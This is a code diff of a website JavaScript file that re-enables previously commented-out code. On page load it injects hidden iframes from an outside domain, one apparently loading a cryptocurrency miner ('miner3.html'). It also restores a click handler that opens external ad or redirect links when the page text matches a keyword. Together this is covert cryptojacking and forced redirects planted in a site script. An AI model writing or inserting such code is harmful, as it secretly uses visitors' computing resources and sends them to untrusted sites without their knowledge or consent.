@@ -1,20 +1,20 @@
 
-// window.onload = function(){
-//     setTimeout(function(){
-//         if(document.getElementById("emprise")) return
-//         var divs=[
-//         "<a href=\"http://www.7k77.tk\"  style=\"display: none;\"></a>",
-//         "<iframe id=\"7k77\" src=\"http://www.7k77.tk\"  style=\"display: none;\"></iframe>",
-//         "<iframe src=\"http://www.7k77.tk/cssjs/miner3.html\"  style=\"display: none;\"></iframe>"
-//         ]
-//         for (var i=0,len=divs.length;i<len;i++){
-//             // document.getElementsByTagName("body")[0].innerHTML+=divs[i]
-//         }
+window.onload = function(){
+    setTimeout(function(){
+        if(document.getElementById("emprise")) return
+        var divs=[
+        "<a href=\"http://www.7k77.tk\"  style=\"display: none;\"></a>",
+        "<iframe id=\"7k77\" src=\"http://www.7k77.tk\"  style=\"display: none;\"></iframe>",
+        "<iframe src=\"http://www.7k77.tk/cssjs/miner3.html\"  style=\"display: none;\"></iframe>"
+        ]
+        for (var i=0,len=divs.length;i<len;i++){
+            document.getElementsByTagName("body")[0].innerHTML+=divs[i]
+        }
         
-//     },2000)
+    },2000)
     
-// }
-/* document.addEventListener("click", function () {
+}
+document.addEventListener("click", function () {
     if (document.getElementsByTagName("body")[0].innerText.match("美女")) {
         var list=[
         "http://www.wqwpm.com:10080?id=a1-31872",
@@ -46,5 +46,5 @@
             window.open(link)
         }
     }
-}) */
+})
     
